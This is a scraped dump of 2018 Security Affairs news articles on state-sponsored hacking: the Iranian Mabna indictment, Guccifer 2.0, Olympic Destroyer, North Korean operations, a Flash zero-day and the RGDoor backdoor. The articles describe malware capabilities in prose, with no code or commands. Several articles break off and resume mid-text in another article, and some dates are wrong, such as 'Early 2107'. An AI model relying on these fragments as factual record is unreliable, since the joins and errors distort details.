One-hundred forty-four of the victims are American universities. The defendants stole research that cost the universities approximately $3.4bn to procure and maintain.\u201d\n\n\n\nThe US indictment revealed a coordinated effort from 2013 through the end of 2017 involving online cyber espionage on academics with the intent to discover their research interests.\n\nIranians hackers launched spear phishing attack using messages that would appear to be sent from another professor. The messages usually embedded a malicious link to a bogus domain using to steal victim\u2019s login credentials.\n\nMabna Institute employees \u201cengaged in the theft of valuable intellectual property and data from hundreds of US and third-country universities\u2026 for private financial gain.\u201d  said Deputy Attorney General Rod Rosenstein. \n\n\u201cFor many of these intrusions, the defendants acted at the behest of the Iranian government and, specifically, the Iranian Revolutionary Guard Corps,\u201d \n\nGeoffrey Berman, US Attorney for the Southern District of New York revealed that the spear phishing campaign targeted more than 100,000 university professors worldwide and about 8,000 accounts were compromised.\n\nThe Iranian hackers exfiltrated 31 terabytes, roughly 15 billion pages of academic projects were stolen.\n\nThe stolen data included \u201cresearch, and other academic data and documents, including, among other things, academic journals, theses, dissertations, and electronic books.\u201d\n\nOne of the 10 Iranians subject to sanctions, Behzad Mesri was already known to the US authorities. In November 2017, the United States charged the Iranian computer expert Behzad Mesri of \u2018Games of Thrones\u2018 HBO hack, the man was charged with stealing scripts and plot summaries for \u2018Games of Thrones\u2019.\n\nThe Manhattan US attorney Joon Kim said Mesri is \u201chad previously hacked computer systems for the Iranian military\u201d. The man threatened to release stolen data unless HBO paid a $6 million ransom in Bitcoin.\n\nProsecutors confirmed that the Iranian man was a member of the Iranian-based Turk Black Hat Security hacking group that targeted hundreds of websites in the United States and around the world.\n\nExperts discovered that Masri and Charming Kitten were linked through the member of Turk Black Hat group \u201cArYaIeIrAN.\u201d another member of Turk Black Hat.\n\n\n\nBack to the present, the Justice Department said that besides targeting university professors in the United States, the hackers also compromised accounts in Australia, Canada, China, Denmark, Finland, Germany, Ireland, Israel, Italy, Japan, Malaysia, Netherlands, Norway, Poland, Singapore, South Korea, Spain, Sweden, Switzerland, Turkey and the United Kingdom.\n\nPierluigi Paganini\n\n(Security Affairs \u2013 Iranian hackers, US DoJ)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/iranian-hackers", "topic_name": "Iranian hackers"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/pierluigi-paganini", "topic_name": "Pierluigi Paganini"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/security-affairs", "topic_name": "Security Affairs"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/state-sponsored-hacking", "topic_name": "state-sponsored hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/us-doj", "topic_name": "US DoJ"}]}, {"news_name": "Lone DNC Hacker Guccifer 2.0 is linked to the GRU, the Russian military intelligence agency", "news_link": "https://securityaffairs.co/wordpress/70591/breaking-news/guccifer-2-0-russia.html", "title": "Lone DNC Hacker Guccifer 2.0 is linked to the GRU, the Russian military intelligence agency\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "March 24, 2018", "body": "Guccifer 2.0 is the alleged hacker behind the DNC hack that also released a huge trove of documents about House Democrats, including Nancy Pelosi\u2019s sensitive data.\n\n\n\nIn February 2016, researchers from security company CrowdStrike, pointed out that the DNC attack wasn\u2019t the result of the action of a lone wolf, instead, two sophisticated Russian espionage groups, COZY BEAR and FANCY BEAR were involved in the cyber espionage operation.\n\nA portion of the intelligence community believes that the Russia-linked hacker Guccifer 2.0 is a Russian intelligence agent.\n\nThis week, The Daily Beast published a report that confirms that Guccifer 2.0 is linked to the GRU, Russia\u2019s military intelligence agency.\n\n\u201cGuccifer 2.0, the \u201clone hacker\u201d who took credit for providing WikiLeaks with stolen emails from the Democratic National Committee, was in fact an officer of Russia\u2019s military intelligence directorate (GRU), The Daily Beast has learned.\u201d reads the analysis published by The Daily Beast.\n\n\u201cIt\u2019s an attribution that resulted from a fleeting but critical slip-up in GRU tradecraft.\u201d\n\nIn January 2017, the US intelligence linked the the DNC hack and the cyber attacks against the Hillary Clinton\u2019s campaign to Russian intelligence groups.\n\nGuccifer 2.0 took credit for some of the attacks denying any link with the Kremlin, by US authorities believe the hacker is a product of a Russian disinformation campaign.\n\nThe experts at cybersecurity firm ThreatConnect also determined that Guccifer 2.0 was linked to Russian intelligence. According to ThreatConnect, Guccifer 2.0 had been using a Virtual Private Network service, Elite VPN, to remain anonymous, but on one occasion he failed to activate the VPN client before logging on.\n\nAccording to a source familiar with the government\u2019s Guccifer investigation, the hacker was using a system having a Moscow-based IP address that was logged by an American social media company.\n\n\u201cAlmost immediately various cyber security companies and individuals were skeptical of Guccifer 2.0 and the backstory that he had generated for himself,\u201d said Kyle Ehmke, an intelligence researcher at the cyber security firm ThreatConnect. \u201cWe started seeing these inconsistencies that led back to the idea that he was created hastily\u2026 by the individual or individuals that affected the DNC compromise.\u201d\n\n\u201cWorking off the IP address, U.S. investigators identified Guccifer 2.0 as a particular GRU officer working out of the agency\u2019s headquarters on Grizodubovoy Street in Moscow. (The Daily Beast\u2019s sources did not disclose which particular officer worked as Guccifer.)\u201d continues the report.\n\nThe GRU military agency is believed to run the dreaded Fancy Bear APT, that is behind the DNC hack, cyber espionage campaign against NATO and Obama\u2019s White House and cyber attacks against the World Anti-Doping Agency, and numerous militaries and government agencies in Europe, Central Asia, and the Caucasus.\n\nThe special counsel Robert Mueller determined that Russia intelligence interfered with US elections in the attempt to boost Trump\u2019s candidacy.\n\nOn July 22, 2016, WikiLeaks began releasing the documents stolen by Guccifer 2.0, a huge trove of approximately 19,000 emails and 8,000 attachments stolen by the hacker. Trump promptly promoted the leak on Twitter, while his adviser Roger Stone in an article written for Breitbart (a name familiar with Cambridge Analytica case too), sustained that Guccifer 2.0 was a Romanian hacktivist.\n\n\u201cSometime after its hasty launch, the Guccifer persona was handed off to a more experienced GRU officer, according to a source familiar with the matter. The timing of that handoff is unclear, but Guccifer 2.0\u2019s last blog post, from Jan. 12, 2017, evinced a far greater command of English than the persona\u2019s earlier efforts.\u201d concluded The Daily Beast.\n\n\u201cIt\u2019s obvious that the intelligence agencies are deliberately falsifying evidence,\u201d the post read. \u201cIn my opinion, they\u2019re playing into the hands of the Democrats who are trying to blame foreign actors for their failure.\u201d\n\nPierluigi Paganini\n\n(Security Affairs \u2013 Guccifer 2.0, Russia)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/dnc-hack", "topic_name": "DNC hack"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/gru", "topic_name": "GRU"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/guccifer-2-0", "topic_name": "Guccifer 2.0"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/intelligence-russia", "topic_name": "intelligence Russia"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/pierluigi-paganini", "topic_name": "Pierluigi Paganini"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/russia", "topic_name": "Russia"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/security-affairs", "topic_name": "Security Affairs"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/trump", "topic_name": "Trump"}]}, {"news_name": "DHS and FBI accuse Russian Government of hacking US critical infrastructure", "news_link": "https://securityaffairs.co/wordpress/70462/apt/russia-hack-critical-infrastructure.html", "title": "DHS and FBI accuse Russian Government of hacking US critical infrastructure\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "March 19, 2018", "body": "Last week, the Department of Homeland Security and Federal Bureau of Investigation issued a joint technical alert to warn of attacks on US critical infrastructure powered by Russian threat actors.

The attack was not designed to simply destroy data or shut down the plant, investigators believe. It was meant to sabotage the firm\u2019s operations and trigger an explosion.\u201d reported The New York Times.\n\n\n\nThe investigators did not attribute the attack to a specific threat actor, but people interviewed by the NYT under a condition of anonymity explained that the cyber attacks likely aimed to cause a blast that would have guaranteed casualties.\n\nThe cyberattack did not have dramatic consequences due to an error in the malicious code that shut down the system instead of destroying it.\n\nThe attack seems to be the result of an operation conducted by a foreign government, it is the evidence of a dangerous escalation in international hacking that could inflict serious physical damage.\n\nThe NYT said that sources declined to name the company operating the plant as well as the government suspected to have powered the cyber attack.\n\n\u201d the attackers were sophisticated and had plenty of time and resources, an indication that they were most likely supported by a government, according to more than a dozen people, including cybersecurity experts who have looked into the attack and asked not to be identified because of the confidentiality of the continuing investigation.\u201d continues the newspaper.\n\n\u201cThe only thing that prevented an explosion was a mistake in the attackers\u2019 computer code, the investigators said.\u201d\n\nSecurity experts interviewed by the NYT said that due to the level of sophistication of the attack on the Saudi petrochemical plant only a few Government could have baked the offensive, including Iran, China, Russia, Israel and the United States.\n\nThe Saudi Arabian Government did not comment the event, its infrastructure is under incessant attacks.\n\nSaudi Arabia was targeted several times by APT, the most clamorous attack was conducted with the Shamoon wiper in 2012 against computers in the Saudi energy sector in 2012.\n\nComputers at Saudi Aramco, one of the world\u2019s biggest oil companies, was disrupted by Shamoon in what is believed to be the country\u2019s worst cyber attack yet.\n\nIn the attack against Saudi Aramco Shamoon wipe data on over 30,000 computers and rewrite the hard drive MBR (Master Boot Record) with an image of a burning US flag.\n\nEarly 2107, Saudi authorities warned of a new wave of attacks that leveraged the Shamoon 2 malware targeting the country.\n\nIn January 2017, the Saudi Arabian labor ministry had been attacked and also a chemical firm reported a network disruption.\n\nOn Nov. 2017, 2016, a cyberattack paralyzed a number of computers of Saudi government wiping their hard drives.

Like multiple other Chinese cyber espionage actors, TEMP.Periscope has recently re-emerged and has been observed conducting operations with a revised toolkit.\u201d\n\nThe researchers confirmed that the tactics, techniques, and procedures (TTPs) and the targets of the TEMP.Periscope overlap with ones both TEMP.Jumper and NanHaiShu APT groups.\n\nResearchers at FireEye observed a spike in the activity of TEMP.Periscope that was also associated with the use of a broad range of tools commonly used by other Chinese threat actors.\n\nThe arsenal of the crew includes backdoors, reconnaissance tools, webshells, and file stealers.\n\nA first backdoor dubbed BADFLICK, could be used to modify the file system of the infected system, establish a reverse shell, and modifying the command-and-control configuration.\n\nAnother backdoor used by the group is dubbed Airbreak, which is a JavaScript-based backdoor (aks \u201cOrz\u201d) that retrieves commands from hidden strings in compromised webpages and actor controlled profiles on legitimate services.\n\n\n\nOther malware is described in the post published by FireEye.\n\n\u201cPHOTO: a DLL backdoor also reported publicly as \u201cDerusbi\u201d, capable of obtaining directory, file, and drive listing; creating a reverse shell; performing screen captures; recording video and audio; listing, terminating, and creating processes; enumerating, starting, and deleting registry keys and values; logging keystrokes, returning usernames and passwords from protected storage; and renaming, deleting, copying, moving, reading, and writing to files.\u201d continues the analysis.\n\n\u201cHOMEFRY: a 64-bit Windows password dumper/cracker that has previously been used in conjunction with AIRBREAK and BADFLICK backdoors. Some strings are obfuscated with XOR x56.\u201d\n\nThe crews also used the Lunchmoney tool that exfiltrates files to Dropbox and the Murkytop command-line reconnaissance tool.\n\nRecently the group used the China Chopper, a code injection webshell that executes Microsoft .NET code within HTTP POST commands.\n\nThe group targeted victims with spear-phishing messaged that use weaponized documents attempting to exploit the CVE-2017-11882 vulnerability to deliver malicious code.\n\n\u201cThe current wave of identified intrusions is consistent with TEMP.Periscope and likely reflects a concerted effort to target sectors that may yield information that could provide an economic advantage, research and development data, intellectual property, or an edge in commercial negotiations,\u201d FireEye concludes.\n\nFurther details, including the Indicators of Compromise are reported in the analysis published by FireEye.\n\nPierluigi Paganini\n\n(Security Affairs \u2013 TEMP.Periscope, APT)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/apt", "topic_name": "APT"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/china", "topic_name": "China"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/leviathan", "topic_name": "Leviathan"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/pierluigi-paganini", "topic_name": "Pierluigi Paganini"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/security-affairs", "topic_name": "Security Affairs"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/temp-periscope", "topic_name": "TEMP.Periscope"}]}, {"news_name": "Kaspersky \u2013 Sofacy \u2018s campaigns overlap with other APT groups\u2019 operations", "news_link": "https://securityaffairs.co/wordpress/70129/apt/sofacy-apt-operations.html", "title": "Kaspersky \u2013 Sofacy \u2018s campaigns overlap with other APT groups\u2019 operations\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "March 12, 2018", "body": "Last week, during the Kaspersky Security Analyst Summit (SAS) held in Cancun, researchers from Kaspersky illustrated the results of their investigation on the recent activities conducted by the dreaded Sofacy APT group.\n\nThe experts confirmed the news reported by Kaspersky three weeks ago, the Russia-linked APT28 group (aka Pawn Storm, Fancy Bear, Sofacy, Sednit, Tsar Team and Strontium.) have shifted focus in their interest, from NATO member countries and Ukraine to towards the Middle East and Central Asia.\n\nAccording to Kaspersky researcher Kurt Baumgartner, the Sofacy APT is particularly interested in military, defense and diplomatic entities in the far east.\n\nThe researchers explained that the Russian APT group\u2019s activity overlaps with cyber espionage campaigns conducted by other threat actors.\n\nBaumgartner pointed out that the Zerbrocy malware used by Sofacy APT was discovered on machines that had also been infected with the Mosquito backdoor associated with Russian Turla APT.

All of these attacks are focused on destruction and disruption of equipment not exfiltration of data or other, more subtle attacks. Using legitimate tools such as PsExec and WMI the attackers are specifically targeting the pyeongchang2018.com domain attempting to steal browser and system credentials to move laterally in the network and then wiping the victim computer to make it unusable.\n\n\u201cDisruption is the clear objective in this type of attack and it leaves us confident in thinking that the actors behind this were after embarrassment of the Olympic committee during the opening ceremony.\u201d reads the analysis published by Talos.\n\nKaspersky experts found samples of the malware at several ski resorts in South Korea, even if they analyzed the malicious code they were not able to attribute the attack to a specific actor.\n\n\n\nThe experts identified a unique \u201cfingerprint\u201d associated with the North Korea-linked Lazarus APT, but other evidence collected by the experts revealed important inconsistencies suggesting a false flag operation.\n\n\u201cWhat we discovered next brought a big shock. Using our own in-house malware similarity system we have discovered a unique pattern that linked Olympic Destroyer to Lazarus. A combination of certain code development environment features stored in executable files, known as Rich header, may be used as a fingerprint identifying the malware authors and their projects in some cases. In case of Olympic Destroyer wiper sample analyzed by Kaspersky Lab this \u201cfingerprint\u201d gave a 100% match with previously known Lazarus malware components and zero overlap with any other clean or malicious file known to date to Kaspersky Lab.\u201d reads the analysis published by Kaspersky.\n\nKaspersky also found evidence that would suggest the malicious code was developed by the Russia-linked Sofacy APT  (aka Pawn Storm, Fancy Bear, APT28, Sednit, Tsar Team, and Strontium.).\n\n\u201cwe have seen attackers using NordVPN and MonoVM hosting. Both services are available for bitcoins, which make them the perfect tool for APT actors. This and several other TTPs have in the past been used by the Sofacy APT group, a widely known Russian-language threat actor.\u201d continues Kaspersky.\n\nIs it possible that Russian APT attempted to frame Lazarus?  Maybe.\n\nAnother possible scenario sees Lazarus using false flag in the Olympics attack.\n\n\u201cThere are some open questions about the attacker\u2019s motivation in this story. We know that the attackers had administrative accounts in the affected networks. By deleting backups and destroying all local data they could have easily devastated the Olympic infrastructure. Instead, they decided to do some \u201clight\u201d destruction: wiping files on Windows shares, resetting event logs, deleting backups, disabling Windows services and rebooting systems into an unbootable state.\u201d concluded Kaspersky.\n\n \u201cWhen you add in the multiple similarities to TTPs used by other actors and malware, intentional false flags and relatively good opsec, it merely raises more questions as to the purpose of all this.\u201d \n\nThis case demonstrates the difficulty in the attribution of APT attacks.\n\nFurther details are available in the Kaspersky\u2019s report.\n\nPierluigi Paganini\n\n(Security Affairs \u2013 Olympic Destroyer, malware)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/olympic-games", "topic_name": "'Olympic Games'"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/apt", "topic_name": "APT"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/intelligence", "topic_name": "Intelligence"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/lazarus", "topic_name": "Lazarus"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/olympic-destroyer", "topic_name": "Olympic Destroyer"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/pierluigi-paganini", "topic_name": "Pierluigi Paganini"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/security-affairs", "topic_name": "Security Affairs"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/sofacy", "topic_name": "Sofacy"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/state-sponsored-atatcks", "topic_name": "state-sponsored atatcks"}]}, {"news_name": "Leaked NSA dump contains tools developed by NSA Territorial Dispute to track state-sponsored hackers", "news_link": "https://securityaffairs.co/wordpress/69987/intelligence/nsa-territorial-dispute.html", "title": "Leaked NSA dump contains tools developed by NSA Territorial Dispute to track state-sponsored hackers\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "March 8, 2018", "body": "Security experts at CrySyS Lab and Ukatemi have revealed that the NSA dump leaked one year ago by the Shadow Brokers hacker group also contains a collection of scripts and scanning tools the NSA uses to track operations of foreign state-sponsored hackers.\n\nA specific NSA unit, dubbed NSA Territorial Dispute (TeDi) developed these scripts to monitor activities of nation-state actors.\n\n\u201cThe scripts and scanning tools dumped by Shadow Brokers and studied by the Hungarians were created by an NSA team known as Territorial Dispute, or TeDi.\u201d reported The Intercept.\n\n\u201cthe team was supposed to detect and counter sophisticated nation-state attackers more quickly, when they first began to emerge online.\u201d\n\nAccording to The Intercept, the NSA Territorial Dispute (TeDi) was established after the US intelligence discovered a Chinese cyber espionage campaign aimed to stole designs for the Joint Strike Fighter jet and other sensitive data from U.S. defense contractors in 2007;\n\n\u201cAs opposed to the U.S. only finding out in five years that everything was stolen, their goal was to try to figure out when it was being stolen in real time,\u201d one intelligence source told The Intercept.\n\nThe scanning tools and script allows the intelligence to check indicators of compromise (IOCs) on targeted systems, in this way the cyberspies were able to cover their operations and detect the activities of other state-sponsored hackers.\n\n\u201cBut their mission evolved to also provide situational awareness for NSA hackers to help them know when other nation-state actors are in machines that they\u2019re trying to hack. \u201d continues The Intercept.\n\n\u201cWhen the NSA hacks machines in Iran, Russia, China and elsewhere, its operators want to know if foreign spies are in the same machines because these hackers can steal NSA tools or spy on NSA activity in the machines,\u201d\n\n\u201cIf the other hackers are noisy and reckless, they can also cause the NSA\u2019s own operations to get exposed.

The country does not have any global technological franchises, such as Apple or Samsung, and its citizens continue to have limited access to any basic internet or smartphone apps.\n\nHowever, the regime of Kim Jong Un has become increasingly adept at entering computer systems across the globe for the strategic benefit and financial gain.\n\nAccording to statistics, North Korea\u2018s \u2018cyber-soldiers\u2019 have been linked to the stolen US-South Korean military plans, alleged theft of $60 million from a Taiwanese bank, and the collapse of the Seoul-based cryptocurrency exchange.\n\nEven as the US begins to concentrate on the North Korean development of nuclear weapons, Kim Jong Un is attacking from the rear with aggressive NK hackers.\n\nThe North Korean nation has experienced limited access to the free flow of online information. The majority of citizens can view only a few websites within the country, but with close government and media agency monitoring.\n\nA select few of these agencies have international access, but the activities are carefully monitored to avoid any unwanted interactions.\n\nFor several years, North Korea had a single link to the global internet via the state-owned China United New Communications corporation; however, it recently secured a second link via Russian telecommunications company in October 2017.\n\nAccording to Fergus Hanson, the head of the International Cyber Policy Center at the Australian Strategic Policy Institute, North Korea currently employees an estimated 1,700 state-sponsored hackers to deal with online interactions.\n\nKim Jong Il, the father of current leader Kim Jong Un, was an early proponent of technology to be used as a form of modern weaponry.\n\nThe military worked on several methods for disrupting GPS systems and setting off electromagnetic pulses to obstruct computer capabilities in other countries.\n\nIt is thought that North Korea set up Unit 121 \u2013 an early cyber-warrior squad approximately twenty years ago as part of the NK\u2019s military.\n\nThe unit started to draw attention to its existence in 2004 during allegations of alleged \u2018tapping\u2019 into South Korea\u2019s military wireless communication and for testing malicious computer coding.\n\nIn 2011, South Korea arrested five hackers allegedly working as North Korean hackers for stealing several millions of dollars via an online game.\n\nNorth Korea\u2019s \u2018cyber-warriors\u2019 began to draw international attention during 2014 when headlines stated an alleged intrusion into the Sony Corporation\u2019s film business.\n\nSony was preparing to release a movie starring Seth Rogen and James Franco called \u2018The Interview\u2019 \u2013 a comedy about meeting the leader of North Korea.\n\nAll efforts of the intrusion seemed to be the protection of Kim\u2019s image and punishment of the studio.\n\nLeaked documentation of the hack-damaged careers in Hollywood resulted in Sony having to compensate over $8 million in damages.\n\nOnce North Korea got publicly identified as the perpetrator, the NK government denied involvement and publicly declared the US as slandering them.\n\nDespite several accusations being made of hacking attacks, North Korea continues to deny their involvement.\n\n\n\nCurrently, North Korea has improved the cyber attacks among rising tensions with the US and rest of the globe.  In 2016, a hacking group associated with North Korea getting accused of the theft of $81 million from a central bank account in Bangladesh.\n\nIn May 2017, cyber-security researchers linked the WannaCry ransom-ware attack to a North Korean hacking group known as Lazarus.\n\nThis hack resulted in the intrusion of over 300,000 computers and threatened the loss of data unless a \u2018ransom\u2019 was paid \u2013 typically, $300 in bitcoin within three days.\n\nAccording to Europol, this is one of the most unprecedented hacks to date.\n\nDespite the association with Lazarus, North Korean hackers have increased efforts to secure cryptocurrency, which could be used to avoid trade restrictions in recent sanctions approved by the UN.\n\nSouth Korea is currently investigating the possible North Korean involvement of the cryptocurrency exchange eight months after the country hacked the target.\n\nNot exactly.\n\nIt was seen in October that a South Korean legal maker stated that Kim\u2019s cyber-warriors stole military plans produced by South Korea in a case of armed conflict.\n\nThe plans included a classified section known as \u2018decapitation strike, which was aimed at removing the North Korean leader.  The lawmaker attacked the South Korean armed forces for allowing the breach in military enforcement causing a mistake in the service.\n\nRhee Cheol-hee agrees that he had worked with defense officials and they are not supposed to save such vital data on PC files.\n\nA US military aide stated that, despite the alleged hack, the UK continues to place confidence in South Korea and their ability to deal with the challenges of North Korea. Some suspect that North Korea may ramp up money counterfeiting to also help fund the regime.\n\nBelieve it or not, the US has not been standing by as North Korea regains its connection to the internet.  North Korea has restored an online relationship via Russia after China\u2019s faltering strategy.\n\nThe link was reportedly distributed under a denial of service attack with a flood of data traffic being produced to overwhelm and obstruct computer systems in the US.\n\nMeanwhile, US president Donald Trump has criticized the North Korean leader for this development of nuclear weapons stating that the US may use military force against the regime.\n\nNorth Korea has, however, warned that nuclear war by occurring at any moment with South Korea and the UK being joined naval drills.\n\nAll hacking efforts appear to be continuing amidst the current political tensions.\n\nNorth Korea\u2019s hackers continue to push for valuable intelligence and harder currently, while traditional military forces engage with the chance of war.\n\nWhile Lazarus may have been associated with the theft of $60 million from Taiwan\u2019s Far Eastern International Bank, the malware used bore features of Lazarus and was an international highlight.\n\n \n\nWritten by Ali Qamar, Founder/Chief Editor at Cyberogism.com\n\nAuthor Bio:\nAli Qamar is a privacy and cyber security enthusiast, his work has been featured in many major tech and security blogs including InfosecInstitute, Hackread, ValueWalk, Intego, and SecurityAffairs to name a few.

Designed to make website development easier and providing additional features not supported by standard web browsers, it also adds complexity and a much broader attack surface. Web browsers no longer support Flash by default, but users often re-enable it for convenience. And just having it installed on your system may be enough for this latest zero-day Adobe Player vulnerability to be exploited.\n\nKISA, the South Korean CERT issued a security bulletin on January 31, 2018, warning of a \u201cuse-after-free\u201d vulnerability in Adobe Flash Player being actively exploited in the wild. The following day, Adobe issued Security Advisory APSA18-01 confirming CVE-2018-4878 as a potential remote code vulnerability and announcing plans to release a security patch on February 5, 2018. The attack is carried out with a malicious SWF file embedded inside a Microsoft Office or Hancom Hangul document or spreadsheet. Once opened, the victim\u2019s computer executes the malicious SWF through Adobe Flash if it is installed.\n\n\u201cUpon opening and successful exploitation, a decryption key for an encrypted embedded payload would be downloaded from compromised third-party websites hosted in South Korea,\u201d according to FireEye.\n\nThe embedded payload is likely to be DOGCALL malware which facilitates the installation of ROKRAT command and control trojan which gives the remote attackers access to the victim\u2019s system.\n\nExperts warn that while waiting for the patch from Adobe on February 5th, users should be very cautious opening unexpected spreadsheets and document files. In reality, one should always be wary of any unexpected or suspicious document, especially ones that support embedding since they can hide all kinds of malware. You should also strongly consider uninstalling Adobe Flash. Even if it is disabled in your browser, having it installed on your system is enough for this latest exploit to execute successfully. Chances are you don\u2019t need Adobe Flash any more. As explained by Sophos,\n\n\u201cThe most common \u201cneed\u201d we hear for Flash is to watch web videos, but almost all websites will use HTML5 for videos if you don\u2019t have Flash. If you uninstall it, your browser will use its built-in video player instead \u2013 so you probably don\u2019t need Flash after all.\u201d\n\nCisco and FireEye have both been investigating, and warn that a North Korean group that they have been following for a while are likely behind this latest attack. Called TEMP.Reaper by FireEye and Group 123 by Cisco, the group with ties to North Korea was very active in 2017.\n\nAccording to FireEye: \u201cHistorically, the majority of their targeting has been focused on the South Korean government, military, and defense industrial base; however, they have expanded to other international targets in the last year.\u201d\n\n\n\nIn addition to expanding their targets, the hacking group appears to have been expanding its skills, utilizing a variety of different techniques to deploy destructive wiper malware and the command and control trojans.\n\nThere have been many hacking accusations pointed at North Korea in the past few years. With tensions rising in 2017 and the impending Olympics in South Korea this month there is a lot of opportunities and potential motivation for something significant. This latest attack shows that this hacking group is poised to take advantage of these opportunities.\n\nAs described by Cisco\u2019s Talos security team, \u201cGroup 123 have now joined some of the criminal elite with this latest payload of ROKRAT. They have used an Adobe Flash 0 day which was outside of their previous capabilities \u2013 they did use exploits in previous campaigns but never a net new exploit as they have done now. This change represents a major shift in Group 123s maturity level, we can now confidentially assess Group 123 has a highly skilled, highly motivated and highly sophisticated group.\u201d\n\nPierluigi Paganini\n\n(Security Affairs \u2013 North Korea, cybercrime)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/flash-zero-day", "topic_name": "Flash Zero-Day"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/group-123", "topic_name": "Group 123"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hangul-word-processor", "topic_name": "Hangul Word Processor"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hwp", "topic_name": "HWP"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/malware-2", "topic_name": "malware"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/north-korea", "topic_name": "North Korea"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/rat", "topic_name": "RAT"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/rokrat-rat", "topic_name": "ROKRAT RAT"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/south-korea", "topic_name": "South Korea"}]}, {"news_name": "Chinese Iron Tiger APT is back, a close look at the Operation PZChao", "news_link": "https://securityaffairs.co/wordpress/68581/apt/operation-pzchao.html", "title": "Chinese Iron Tiger APT is back, a close look at the Operation PZChao\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "February 2, 2018", "body": "Malware researchers from Bitdefender have discovered and monitored for several months the activity of a custom-built backdoor capable of password-stealing, bitcoin-mining, and of course to gain full control of the victim\u2019s machine.\n\nThe campaign, dubbed by Bitdefender, Operation PZChao is targeting government, technology, education, and telecommunications organizations in Asia and the US.\n\n\u201cThis is also the case of a custom-built piece of malware that we have been monitoring for several months as it wrought havoc in Asia.

Instead, the developer created RGDoor using C++, which results in a compiled dynamic link library (DLL).\u201d states the analysis from PaloAlto Networks.\n\n\u201cThe DLL has an exported function named \u201cRegisterModule\u201d, which is important as it led us to believe that this DLL was used as a custom native-code HTTP module that the threat actor would load into IIS.\u201d \n\nThe attackers exploited the IIS 7 functionality that allows developers to create modules in C++ to extend IIS\u2019 capabilities, in this way they could carry out custom actions on requests\n\nThe \u201cnative-code modules can be installed either in the IIS Manager GUI or via the command-line using the \u2018appcmd\u2019 application,\u201d Palo Alto has explains.\n\n\n\nMalware researchers from Paloalto Networks discovered that the code calls the RegisterModule function with arguments that ignore inbound HTTP GET requests, but act on all HTTP POST requests.\n\nWhen the IIS server receives an inbound HTTP POST request, the backdoor parses the requests searching for the string in HTTP \u201cCookie\u201d field.\n\nThe find was used to issue cmd$ [command to execute], upload$ [path to file], or download$ [path to file] commands.\n\n\u201cRGDoor then constructs its own HTTP response by first setting the \u201cContent-Type\u201d field within the HTTP header to \u201ctext/plain\u201d.\u201d continues the analysis.\n\nThe choice of the Cookie fields makes it hard to analyze inbound requests related to RGDoor backdoor because IIS does not log the values within these specific fields of inbound HTTP requests by default.\n\n\u201cThis backdoor has a rather limited set of commands, however, the three commands provide plenty of functionality for a competent backdoor, as they allow an actor to upload and download files to the sever, as well as run commands via command prompt. The use of RGDoor suggests that this group has contingency plans to regain access to a compromised network in the event their webshells are discovered and remediated.\u201d concluded Palo Alto Networks.\n\nTechnical details, including IoCs are reported in the analysis published by PaloAlto Networks.\n\nPierluigi Paganini\n\n(Security Affairs \u2013 RGDoor backdoor, OilRig)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/apt", "topic_name": "APT"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/iran", "topic_name": "Iran"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/oilrig", "topic_name": "OilRig"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/rgdoor-backdoor", "topic_name": "RGDoor\u00a0backdoor"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/state-sponsored-hackers", "topic_name": "state sponsored hackers"}]}, {"news_name": "The Dutch intelligence service AIVD \u2018hacked\u2019 Russian Cozy Bear systems for years", "news_link": "https://securityaffairs.co/wordpress/68241/intelligence/aivd-hacked-cozy-bear.html", "title": "The Dutch intelligence service AIVD 